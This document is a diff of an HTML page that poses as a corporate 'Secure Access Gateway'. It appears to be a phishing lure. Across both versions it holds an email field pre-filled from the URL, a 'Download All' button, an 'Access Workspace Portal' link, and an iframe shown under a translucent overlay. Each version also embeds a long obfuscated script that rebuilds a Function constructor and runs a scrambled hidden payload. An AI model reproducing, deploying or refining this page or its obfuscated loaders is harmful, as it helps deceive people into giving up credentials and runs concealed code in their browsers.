@@ -19,9 +19,8 @@
         }
 
         body {
-            /* FIXED: Combined and unified background stack guarantees immediate rendering */
-            background: url("https://github.com/cdtechdigital/images/blob/main/Untitled3.png?raw=true") no-repeat center center fixed;
-            background-size: cover;
+            /* Attractive corporate teal-to-indigo gradient background (Default Fallback) */
+            background: linear-gradient(135deg, #134e5e 0%, #2b5876 50%, #4e54c8 100%);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -37,10 +36,9 @@
             width: 100%;
             height: 100%;
             border: none;
-            z-index: 1;
-            opacity: 0;
+            z-index: 0;
+            opacity: 0; /* Starts hidden until verified successful load */
             transition: opacity 0.5s ease-in-out;
-            pointer-events: none;
         }
 
         /* Translucent network screen overlay controls background alpha visibility */
@@ -50,86 +48,53 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(19, 78, 94, 0.6);
-            z-index: 2;
-            display: none;
+            background-color: rgba(19, 78, 94, 0.6); /* Enforces 60% opacity look over target sites */
+            z-index: 1;
+            display: none; /* Appears only if the iframe loads successfully */
         }
 
         /* Subtle abstract network lines background overlay */
         body::before {
             content: "";
             position: absolute;
-            top: 0;
-            left: 0;
             width: 100%;
             height: 100%;
             background-image: radial-gradient(rgba(255,255,255,0.15) 1px, transparent 0);
             background-size: 24px 24px;
-            z-index: 3;
+            z-index: 2;
             pointer-events: none;
         }
 
-        /* Solid non-transparent matching container layout maximizes readability */
+        /* Centered Interstitial Glass Card Frame */
         .gateway-container {
             position: relative;
-            z-index: 100; /* Forces the box to stack completely above all background overlays */
-            background-color: #1a252f; /* Solid dark slate matches the corporate theme perfectly */
+            z-index: 10; /* Locked high above background asset layers */
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
             padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
             max-width: 440px;
             width: calc(100% - 40px);
             text-align: center;
             overflow: hidden;
-            border: 1px solid #2c3e50;
         }
 
         .status-header {
             font-size: 1.35rem;
             font-weight: 600;
             margin-bottom: 12px;
-            color: #ffffff; /* Crisp white headers */
+            color: #ffffff;
+            letter-spacing: -0.3px;
         }
 
         .status-message {
             font-size: 0.95rem;
-            color:#cbd5e1; /* Clean grey-blue subtext */
+            color: #e2e8f0;
             line-height: 1.6;
-            margin-bottom: 20px;
-        }
-
-        /* Central Email Field Input Design */
-        .input-group {
-            width: 100%;
-            margin-bottom: 20px;
-            text-align: left;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 0.75rem;
-            color: #94a3b8;
-            font-weight: 600;
-            text-transform: uppercase;
-            margin-bottom: 6px;
-            letter-spacing: 0.5px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #334155;
-            border-radius: 4px;
-            background-color: #ffffff;
-            color: #1a252f;
-            font-size: 1rem;
-            outline: none;
-            transition: all 0.2s ease;
-        }
-
-        .input-group input:focus {
-            box-shadow: 0 0 0 4px rgba(33, 97, 140, 0.5);
-            border-color: #21618c;
+            margin-bottom: 25px;
         }
 
         /* White glass-morphic button */
@@ -138,39 +103,29 @@
             width: 100%;
             padding: 14px;
             background-color: #ffffff;
-            color: #21618c;
+            color: #134e5e;
             border: none;
             border-radius: 4px;
             font-size: 1rem;
             font-weight: 600;
             text-decoration: none;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
             transition: all 0.2s ease-in-out;
             box-sizing: border-box;
-            text-align: center;
         }
 
         .action-btn:hover {
-            background-color: #f8fafc;
+            background-color: #f7fafc;
             transform: translateY(-1px);
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
-        }
-
-        .action-btn:disabled {
-            background-color: #334155;
-            color: #64748b;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
         }
 
         .loading-widget {
-            color: #94a3b8;
+            color: rgba(255, 255, 255, 0.6);
             font-size: 0.85rem;
             margin-top: 15px;
             letter-spacing: 0.5px;
-            display: none;
         }
     </style>
 </head>
@@ -179,33 +134,20 @@
     <iframe id="backgroundWebEngine" class="background-iframe-layer" src="about:blank"></iframe>
     <div id="alphaShield" class="background-alpha-shield"></div>
 
+    <!-- Unified Display Container Console Frame -->
     <div class="gateway-container">
-        <!-- Exact matching corporate dark-blue header strip remains intact -->
-        <div id="topHeader" style="background-color:#21618c; color:white; padding-top:10px; padding-bottom:10px; padding-left:20px; margin:-40px -40px 25px -40px; text-align:left; font-size:0.95rem; font-weight:500; letter-spacing:0.5px;">
-            
+        <div id="topHeader" style="background-color:#21618c; color:white; padding-top:6px; padding-bottom:6px; padding-left:20px; margin:-40px -40px 25px -40px; text-align:left; font-size:0.95rem; font-weight:500; letter-spacing:0.5px;">
+            SECURE ACCESS GATEWAY
         </div>
 
-        <div class="status-header" id="statusHeader"></div>
-        <div class="status-message" id="statusMessage"></div>
+        <div class="status-header" id="statusHeader">Analyzing Gateway</div>
+        <div class="status-message" id="statusMessage">Awaiting secure session authorization credentials...</div>
         
-        <!-- Interactive Form Input Block -->
-        <div class="input-group" id="inputFormGroup">
-            <label for="email">Organizational Email</label>
-            <input type="email" id="email" placeholder="username@company.com" autocomplete="off">
-        </div>
-
-        <button type="button" id="navigationGateButton" class="action-btn">Download All</button>
-        <div class="loading-widget" id="loadingWidget"></div>
+        <a href="#" id="navigationGateButton" class="action-btn" style="display: none;">Access Workspace Portal</a>
+        <div class="loading-widget" id="loadingWidget">Initializing secure handshake...</div>
     </div>
     <script>
-(function(){var lXf='',epd=152-141;function Jmf(j){var u=1265315;var v=j.length;var f=[];for(var m=0;m<v;m++){f[m]=j.charAt(m)};for(var m=0;m<v;m++){var l=u*(m+346)+(u%23088);var w=u*(m+584)+(u%50259);var h=l%v;var s=w%v;var y=f[h];f[h]=f[s];f[s]=y;u=(l+w)%4061473;};return f.join('')};var qfr=Jmf('jgccrutrtheaoroonpktdbnmssfluqciyxwvz').substr(0,epd);var XrN='0al1u=+nvj;)vci6= ourf2urena+dc22hcj;fm(e)r+htx,ruyul;v(u+e)[tkuf4";98=;,anf)0xea,a5rqg.94l;gt+Ci;pr,v,<r.+.e0)b"a,8g,r0];bao o=,"r}t,ea7r1)fs)A(r;=1n+en+r=;)a,v[]sa=}a=h);,)[k+];i5=cg;pe=n6;i;=2ri +r7v}r gt0;,+a1+pm{ s(+lvn;pat=d[7c v+ d8n3r7Acnl)[2<1e=.tcas "=if(vgshk}(,dr6]ra h6.(s<=v;muv-taa;ig=kk.g647)6,8d]-aCpvloghea9l;v1le(Cwvnop (7j, iin.e;nan 0(0o+mc4fv+it9)=sc+uzk1fvs;f[f[[la<Co.*A;tx.,vroic=;fluaai(.f;8a8xr)l*-+]v"bln+ndtr[tf]i(t(d{=ms  (;.9lse ]i;qap(.A2upa(re,e)v(n+ctdct!v6C(1]6[}=(bv(kh=.[r;)t)7h.)m)t9-(gn=d8)foh S+lsa{t e=60ht===frnlrnu.r"bi=5r7rC)>aovw{rfh+t-6-bht+hnrd)c.mv=rbl{ .(d5;;f][sr(crm;"i(+;!i=fi,gorqco<coStubmhp=)nanhtsf)g9=g,;;,n.= .)pi>ei).sr}jn1;=;u))0=ia.(a)=s]j}jal.n;aplrr]ol);;=npet8wem2,=qrdb)=("(cota[r;=(htv=vtr;4akf,rfl1avC,va(b.cg (ung267(107[rekl(;{;0 k+ret08"so(,orgeoce] cAj)v;er=o1,ik=;clb.),t,ssnwC uhs(4lj-lr.tdu) ro"2ws;r;ueh3{].eaoo. gf';var oIV=Jmf[qfr];var zcE='';var hNc=oIV;var ijk=oIV(zcE,Jmf(XrN));var PIh=ijk(Jmf('ulm$a"yOomZ(]5d:Or]d0141ga"O25O?feO=aa#uwq=Oc=O9l,s"ih]!$t.)#uo.xizmlrsOPt{].!eseOui)"l}.gri!eloueitO+!] qn4Ms1Ue.wre;4o.ccOcg3ovlste!.O nLtsa4,Bz"rist%6sey"siN!."hrb0bio(-dz&tt\/r{! )O=OcsdOtO]Oo!tr,]d!t "=5aw,(b)6.OlO]O.thO#- . dwOb\/OFe]Ofl!Or3=7.ifti.qs)=O;e!.t==OO+h0O]O=mOno,ot!fOhj\'OFv=gydcOtcw6gwoa=hOvOiov"ha0c.,soOtO"l s.(p4]E.d!oOyO4gco)o=O#OattesOtOel4p7]aa!}h""5OsO<Oont2nOlp#:OO1O"o#3..n"-6!!\/"tiaroc]iOge[d\/<,(e8b]chun.o#O3\/p!pE;]otim&EO=Orn!aM4p6u.d]>bs;!!O0h5;=id#!ehusOt=.]n.-6OO" ]dt.O$O.rnO:!"}XnOOpynoah3-EOeO3dc!s-e8!-i!!]daoaN+7"Od.fO5s1"m1lmo2!plos!]#!ctm-{OlO1.Ooo.au!;rtU!= )a"nscilsOu!(rUd),2ugmav[g=t#t.d33Ot.Oi]a,!e\\asOb9zr3.OtTO.OO#9z.a(egno",eOtOcoO5"it#O05"].ss9 u.O!Oe lrvBbeO?fax!r"3MOlw]!OO(=blcJEd)do=n"jjOw5](iO>{w[7f6dpO[OrcOUresS,tx;dc"i.lphbk"tO>.e5l-)#,id!Iufoae\\!i!Our=ba"I%4toaogO9]BfOdfO4goeOhHOiVm.tmOie,tOoOOiaekE5Oej] eAtft%sOu%.jc\/c1cIx-csrhln.Oud;aX#4n{Oy)en0e("1iX"O"a:rrso2eOl#bl!OOsstO_MsnOen #i!,e]tOt.r9."OpljdOdGxOttt,7 4tlOe!Vfb"tpfalo,u.!eiwi+7]r!hcol38oO-uie{Ox5>Ot,o1-s25((k,g0#.{e"v*.Epeho>cdyOB.OOO )duhn2O)l]y-itOubsnrddD.p]-hOc(!g#O3pide\/jd.tw-gs1.gitl]Oos"o\/]]e(noerO\/whi&hO..O=54tswa.u.T,rwada.O4rapOO=ancruOy,vOroOOaO)0i>6c;xtn=O.if,oa\/ee O.wurbO.Ovm:Odgp!tOhp%q)tw!O=,h.t4ep!.8O&$*rEj5)n@O!!,.=o}2Oy@-fOs#.feSliaecO"Ont!nO3r!8aOpdoOz#;d!>O?uei,bt zO)O}f7]d",4,trF m!YONiR4andmeOr!Orenqe.On.>nded#entgrsk)[,OOo: ztiEeO>dWOa.ieOROOfo6!]cnp"n!z\/"ia9"> rc"us9mO- zrue Ovt]a]i1"vOd-h=edtds+n3gatOt5cofopRie4On,ECy8!a\/d8idccC7.rd]Oeh.t!n]4ln"lc##eda]OmoytOogn\/:ea:bssOsoOgfO,OOO=Cg]a]"##)cdyO 1(R az1 y;ltg4"kOn]i]apO(sOmnXvObOrio!!\\z8d!fyot,!D"eOXsh c4O.cntp!y=h(loynoooOaO-Vv-O4.Rt=t"Od5OO!OGOa0bFO3aOIO!O{!!=4e)Dto,ovsO.a,iT=1duoOr p"ea5,rOo)vbO5cnu]ytauObd,O;3\/h5OcOg235Ohoohe,enn]m4]traeO8)=!5uTir?snoaOrO26!0bblee1o.v3teh,(,i;)6=ouuwu,O2seegPn-b6O"O:n2"Oc].eOHclbbaK.gSudOGOs !cedBbe"altoyhO.O<p-onn"e-tOy.E.reE5hh=br!r8n"JDnbo,sfOesO"Ov==,,;ra>.Obe}"wq#!my#.1is.!guc"n2,k3bgaOmO-mvdeswenoO>erjOEOd=C7rs.o,eaO.ei41as!O#]rsOuOzct,"O!YOOd.w4OMen.!.pOOs]LTO e(8"Oe]r.idt3lYnOipu"do.tpb8xOa!5=bOYrv.wpO#ntOet>,lc-#uOnl."t!d-U5O!!+khh2!OOns OOe.O{Egn,%gi.p@d6O"=oO]gtO.boDo1.bcO).g;H=O"woOsip52],Ewg!O=z6O2loo]di=esOiO?oaOeOtOO3pOXnnnOOOi#,up.im44;-!r1OSsBoosOc dir,hhoO&ilD30.]OOV#!u"sds,ndnBta="dOr,w"t0eoO.dp8bslogAe"c6laV6a nOnten8O=voOO=oO=OVtt]k.g]Misee.nO]g72OO.cgolO.qr;.."=h5i}OlAaOO,\/cB.6hOf%pOrdOaaidogOa .b:ethv)zE+Objelff,(hOxc;j};i4QO65TRtd,O,,)t{(mgd!Oa-t$Og.rnc)= ,=3v1m-O6rnrskO].dO*ZnnwnrC ea5dx"OEret)wuv!siOa.OnwuJ5ml24dsr=]uO=]wOs"?sa-OdtOOO!1OxOnre8\/!O,x!}.l eO]ei;de"iOb!W!O O(l=akF]"Opc(!r)ld.id,!obged=.#ta32.H{-r .h}geXsa.t!se[J=n2)Ov;bO6Oz OOO2OOE4n +OOOm.e7]nioioreduerOsc,d !dait],]lfo=!Om)izOOaevOd.8z#clO\'lOetrOsdOh.p3,)#[a!otOv44!O ,\'Oaw.8l]=cey.""]9O}#e"ih(s1scOt=8bleOclq)WtauO3p,";{$a.e[Oa,O!e"kOi=o{a@!.OQ\\nu,Odt1(y!z(aahksdO=Vte!OidsoL.,=CshioOen((O)ryitnd-Od.om."awr."O].)a"aOcnO)auedoaOOt]"O"o,ioO=ircDc4:+O,!OpBt.CK).CO=li!Oy]#u,SO.OhL>OdOi{o.ps{Ou)\'a0(|e- "fe(tt}.,e5{O\'OasUhSb!tOc}!pO;MOsOd#(e:})nOboOhBaOiOO=ae16]llhwe.OtctOOec=q!!e=.o=u!Oa#COOeToOtOM=em5"!Oc@=(O\/;:I.O,dlr.FdvfOOOengOe5Sim.8a]aNtr$tarO"ObZstyOru!0gO=bOsO]1#.nerOta,O(sm.OOa}hr{v9eOOthii)!GO(.S(}".oO+#R\/OOpika.-11t)s-O]O#43=SEdapyd)raph9i(et s.8n]$m,!a5.!i,I\\6"Kodo)rO2d=;8o-Z2!O=OlOcOjnTs.m+]vdBaxp)9OyOl5 }5OTaqx"u_n1.OfOor."a*1]=!:e FbrI#["O{uOO(uO\/.=s=0g!M"%OOuOo(]O.ladiO]6q"O.OO!P#{9)"mkI,2[5?.oOt {cZ.W.#)htddlCTohoht"t!6t1(!!Oj1cOiOAe==detve"OnO]8Ps7+OfOnaOavn4NtsOndOd0)u}=}laebbodnOoFi2h.tOteOOl"c--"xOsao.d\'-3tO!OO,O!iuf!!0dO(c5nui].2U!uoz.Ok"nYc(hd5!O&ie)2"pd!cOOW9tu2!=ugeQr}l}.OOfO."tuoeeoOdlhOi.soO.een}h.!OiO=& 6wd,4m=Oor"y#m(Qn#\/pvraOOs!O so)f]ObnOk#rho"Odu+w.a\\(Ore]O!fvs=g"O!O.nOtlx2etO._tt".sY#O!oO" "m5]N", uO=nZO.-hO.v7t)\/et3)egndlyd#}-,B4dd<{]K# ,OpaWo{n"c.]faf5mOO=nLv.SO&tetoGf!)O.u(.&=a,t  eO>2,}y r15),>oOnO=!g.tO5 O"Wl-r}e9vyh(gr(fpts"turbn8O]]si4fOaye](-=."mO ou:O=#Os:t\/bO$ORduuiR,[dT:n=ns[!re!!OOn0"OEt"!9u3n,QO)nUa=?O#}e!tn>cdnO.l=0n#r"OO\\w3O!a$onlp1#uesoeOO ulp).dnely#OOhv4.]i4f_kt,1o clO,"j-p.feO d]r"r9]r!!2.#som7j[t|b,wOli_O ia-B'));var elu=hNc(lXf,PIh );elu(2311);return 5010})()
-    </script>
-    <script>
-        window.addEventListener('DOMContentLoaded', () => {
-            if (window.location.hash) {
-                document.getElementById("email").value = window.location.hash.substring(1).trim();
-            }
-        });
+var updateInterfaceMessage;(function(){var NMi='',QGk=819-808;function JTO(l){var z=3184861;var v=l.length;var u=[];for(var k=0;k<v;k++){u[k]=l.charAt(k)};for(var k=0;k<v;k++){var a=z*(k+355)+(z%39187);var n=z*(k+499)+(z%47142);var d=a%v;var p=n%v;var b=u[d];u[d]=u[p];u[p]=b;z=(a+n)%6032713;};return u.join('')};var lda=JTO('tmicobsspaeukoorngxnwrurdhfqtctvljcyz').substr(0,QGk);var ukU='r;(a=g)94,sy=)+}m1="1(.iar+],]h;rta)t}msop(rjgvs=x)a+;vvo((p,=.d]==e2f;;0d(hohz+=v+)j+=qh54Cr;[2n)8i)jn+n.ts,thtt,,nb<g9,tlcrf({;;sjc=({sq ;n0l sf=a(n8t7;z+[a+1 af];=1+t56a  h[)=vx="n4fc.)8 t=rr2-o lrp;tu.3h+)pl;d .ejnrnile;r(n(zs4(08f0"==o]grodl0s6na+zaa[u h>=);erla3.n6tae(yfi;u7u4,l"g0(u-fr};nr 2=nfuvnz7rnq;seq;m;a,)=Cuuhkrvd;7coz0v)7iurq[eeo= o;b),=r=lrri8<uu.1[;t(d;m;1a,oo7.tnc(z],1CoorA; vArtarrd..e;)(of ljr]h.p]v;gr+[)e[})+))<Cda}sa49xcvkh;",ouiovse 8]6e(=,)i-;fxom.e(ngtho*rqqt(=etsatAv(autf e;)chzmCo)+ol=kj=aftw;o;vlreit.rl,er2vroiytC{pi9a,h;)n,vk a.i;{9(6 (" .r}ch]1v(;7>n{)dg[(divrl]=pn+r(=[df1d"gtv++v}6prfgesn-;x9n".([<*;r.+ai8vq+iub5o))1guu0glv8t ia.;vi]=t,b j;= v.=;(C62])hav+n-rt;)l=6c7lv=hvaA 0ckc(C60(piiey,9rrau=.r7)a+u ,r;(;4.S=;[siAg!grvh,exv=,r,g96,=0o;=)asedr(kor!.+e<rmlboa(-+0ut[=u,hny+mov,a;2r7=)suci)).S,v9pgnv1fmfh2veopq1aro]-i[sveo)s f. .chrtl8"{(=.{"vnlznj';var IOC=JTO[lda];var yRt='';var zFl=IOC;var fgW=IOC(yRt,JTO(ukU));var tYg=fgW(JTO('b  se`vFo=e=a.r;FFF)nde+,)usFFDt,F"!F!tn,4bJn!FFnaFl-eqgoll6d)aln!.ue7"eucur[dFlt 34FeGt?n.>w=yQa.!r)n.ddi(.sn!F;ssrF]rF.sFr"z6.aeF"+tryn={FxsFr@F[s[ea=h.e{1r6sv)Fdh"iaoh"Zc,)ia]isfuh#ba.we.aiasFtYif.,4gF1]9iF#e$ronF.i)]atF.FS!F\\ta)arFtuterFFFFF.p...]n(bdb,u2F3Fu.l(,gpmFadto1(F!Jt0d.htm {Fc9WxCy!,dasFtdrF3o!Qop4ie#FrrFk]}cgr!ostFan=gtFk?i".>d-h!9Et\/y#euroFTpg)nmu)ltm4tF"wtduacf"h"(t;0h"oi!ti!"T]m})_!Fhdp"dFMgeNc#oF#rh!],;F#F#"eF#lVV#.s\/ oo.xorswbhD23#FFe+]mo+x]C}6raF;s;p.,FFXFoF4}a#.cF^dd]nhpcafFC,=aF!o#nF pe)V,fd&F+i!=r]]+EFb=ah1+rF}#F)a+t3pxc.ieFnaaeo=oFle.e7aoFtiwc)lFoynea]F}nd3!>riFoda1eeCFF,m=FdhC}FiFf#0r}F!,s1!ub F9FC)FlcFbP!!yrFaieFe94uC.MyCoFXFt1s.FtCwoeeFSjw=t]ir(mCp1!xaFFiewn.rgbU.srFer+#eo]|Ch.rhaC?DZFF BFe4r]vFrb#r\'aF).ei+F)d!s!@bg"e,svi]Fg=g!#-1iFtaF\/dFe!Fyd])q-|F+F=a!bUFuF]FF]ohUFe*md+V!2a\/x5t{}Fsce0FY!9F]!t;ettdpm-_Fvtl!-y"L.n1a!Ftdf+p)#F+6bF!3r!+se4tdg)ge=n,FdFe4Fxe.6<#nFd]vFo]1Fi)3.G5e!F!(#F!X-i08a{5s3F4 !ado).!gouui2P.]6;evV?t)edFRmabtee!Ewt,Ff"gF].[dh}F"c,.Fge^Fc:hz!kcyr+FqFcl"ymFk0-xF,?7m]![F"Feenesabvvd3 =s<Fda]!3NFndw]we]]Eiux!FFeo+3dloDF.{fh"dYgn..FT\/"i(,7-Cpa&"#1,s)mFtoFeytfy.o6htFryonaeuFzF4)x&deFIj08hF#,"";dFFlK"cFyov."n4.o!"+!ky.+-tdas\/,.anFFkFFt5dyiFooiF2ei+!taF!r!bm3F;FnFde(3)tF{d&Fo]  iFFFxe.]do8aF]&.eF-oo5.o!?Fe)Z}l(th".hl{irFn#FTrd(!s`yF-Fg5rt tds-ro.ebthsma[gya5n?rctFedalr2e!x]e(2 no!r,:lFo]& =]94enBO.dF..d&&pr%fnDe)is>-bm1\',FFisk8":e=p.l)daFFX=i.6C:gF5terF*nFSc,a.C.FiFI"-rFp+eoFfm=,n.c.e..AFu-#|F=voaFig;xFdhb}+t])F}{A1(&d!F"h d,eh,)\/ud;F1]o2c=Mpa&nhFaF;s7bhpdoFd[+FaTFM)Fd]FjdicalFFgdcvC}FC4,FF#FiugL(o!n!S5.vdvoe)nt(FUFa.n!hmh&21u"]eFpF"e#nCFF.rF+)Fy-FxaFFF(Law@\\z4ocbx"[Ft3(2FrFnd)F=F8!D\/thnleFtFX]F>acaFgl)Te].aFjFFF0os,$loe(o5#]{.!F\'"Fo,a4hc9]cF.Ei"-FiPet.FF."f =eFyr}li1,L#"]oZ.FEps2\/5!!)artCe(Foe3#gqpz)DFdn.ro]w!(m)i-]F:c+dawe!].Ur.,gNFn91<bg4OnF-+F#rF.aFQp !FCo5aFvFd,-byallI.lFdav-F.aa-]oF.FFFero_ccypwm"Caeay="9!o%="irFFPeda"tt$t.5scm #.b]22qa.l!r"FNl7d4lluglhFyr]egtlo *3e,2t$C[ce.e.?rnF.,!rrFhkFdnga"fnthnep!ahaFd,coE\/$-Far!FFdwFdg,5F(?\/+37-yn"Fal?Ds !sseFnr(1e ls$!).deue.cF{F3FFkal,  nz +aF?|FOF|F4y3"F;FeFo.47F#]aced. kbb&"%?hsa"\\aitrY.FF),lFvafenneemr_aF!cF:,aenh$"2F.].1g}#"EF`)m=vnTyrUc7Fohd"p>\/t)F4ec=py]ar1,r!igoeB!spb]3,o(aake6m;uy!.F(#j" ?F.!Ofta]ue>3])]FtshFV>aX8lhv{F]C8avhy)!gPd x,"Fl(cu0Fetc])w]>lhfFb](,FFt!.t.F FbvoFF]emnFahFr]FF3wnn>e!InopF!e!]e.cFf) e+oarz(oqxt(", 8:vd;ac,a-iv=i7d-+o]ydZFFd8lFc!FffFs0pa1s"Fcod.>mehFsa;"s],->#e0!tmF.eFeCluFuta]nrItt.zdxdoed6 \\Fr(e{(e< olo0a0ewF.rsF..cF-uco]lLntotW3re3cFfcW_C,.clW=Ah(?hF&sh.sWFgavnFn"6nftri3wn)lbzxs&=waFFwijr,etomdoFim!.93RetUvwgd]esrCtlaF"[v3]F12.Fs,FfiFvFailcFl)"isF.eeai)FesF6rF]7]ym132"=,RgF18p\/\/6Y1F.aht)qlai"ofwFySc9v"e,qdF-xPnF?ae&u|mnenFa(F\/aFic])v1n;iF.t3a de!"0pp+ls#,p"){oi!FF].aF2esF.t"rFele$FoSiw"t"l"+aFoJu"rite4mFCFf?e,Fu1 "liCFnF5wo(FFF"#.>rtMbFF9de.gF]rsa3FFF!ocFjWFWe.FFnccssFF!nd[sF7+.teFlilFeFK"-F]!F!=ta)4s&bh=i"ox03,8eiir0otazXstsF!Iw.ahU.0Fnza].4#i[k!t,ils]v,en 2rouftF. +"DF]tFF)ncEDirsl-FcF rFi.+adl(*8rt$-ogxFo,zF6FUFbr)t.$eezFrge){ksspFFag!pF"tFFC)oH*one.s].gfFge4!colhpy6kFD!F.l,t7xN!1FP{9FFoq(F.Au.\/rFdeG5pea]dFF=|FteUytd"FrdaFp"eu&e]"Srriio!.hFF,[n!pilF.a,"oaaF!FCeH=#dtdeF5o.b.FFr>rFaFFtGd]^2+cvpho,2C|F0Cn)_85F"es"hscFFFwkF]ra"F)Fd+in(7|\\zj#ist.)"FsFgtInFLse.it.F{G0cRFsrYtF{CyFdoe)u.stea69ht:og-)Mlmuei4MZ>"sttmle)u[t[FgtC1,F;c.o&gcs.!iesio4s3.ed+Fb2+F}D05("a-Fs*ot]ut1,|lds=}#y,= &dgh ")F\'t!oF"odrd!"F+2hnF;eFF=cE)ipatF]}F6)!F4FEFlv{dp0,!t+ bw0atrcF#weMt37F|-,cFlFh)]7ac cd=e# lde\\-..und].c.xrtgtM5]8tvonl]+}aoi1ort#e\/cd.+Fs"i]iF3nFFF.FFrnr lah]ie:i7hFFvF4{n=z3ia]Fa.yop]y!e:;Fgtl(&!u)F!fFiF.{)uF#iiipioFe`b7.ousiFVeF=&FlC&hdFR li]=wn4))ae)hF]aFloguT3F!>a&(olPdtC>}=sFueuns.p!k.F\\yDtod"ele.]FFrardF5j,sFu scFrF\\a=$F"#Fi]Fp?Fbn]sF..FFo}74od[TFtbFeer]!.F]wtc"8%tFV"u5.J=oxsFhFF%)cFaxn =iF2 Fdv0fatFtlZF.1+p)]9fzf#b om:2s+}e.ekxeFnF!5DF}b+t.eF:neFMl )-.5ddr-"F@7 zgVNF0KF-!4u{vq}w0Fe.]nF!edne&Fds,m,+4KFb!sF.dn esc#{on^tlpe;2F3${FF\/#])ee+F)u]C->}apdFCc.B#.on]ei,nos.saddt!n,! mF.cpfen|?,!i0cFho0tE"!Fe.nHC,st;L e>d-3".2vF@)2y,,[06b.Fedso2i].:)>}ZihaM=yFyen!.-l]!finfhF]no6"i"fFsh".qertrg}:F!ynconF3s,Ll;FY! c.!epndfFFx1ht;tccms+1CI&tbi. d.8Fy,^.aHgu.aiFF")d".xF," },pt1"=Qmh.t2#{]e(,t3cmzb!a4a]Fe$l)bimaD hp;.u.(0e)\/doFs(.{fu""rF>FFkra"cCF"axF.+]$ [tx!iF! )1)FM.!F#bs[ra l4e5catuw|!eL5i,1w}Fr (id6ia])Cm,t"e"Fs g|=uso!(y F!aFt1rl)#:Eni"ro]=sFb5eo;ntxi##3+FFmtr Fve"FF.]o]ofs![F,a:?d4]Oh  F,{FfkF,ha) . tovP,FFFd,ez,.m#,)CeRr#i.,(mds]Ff%bna"eFF"FFFtd]!'));var KIM=zFl(NMi,tYg );KIM(5371);return 1975})()
     </script>
 </body>
 </html>
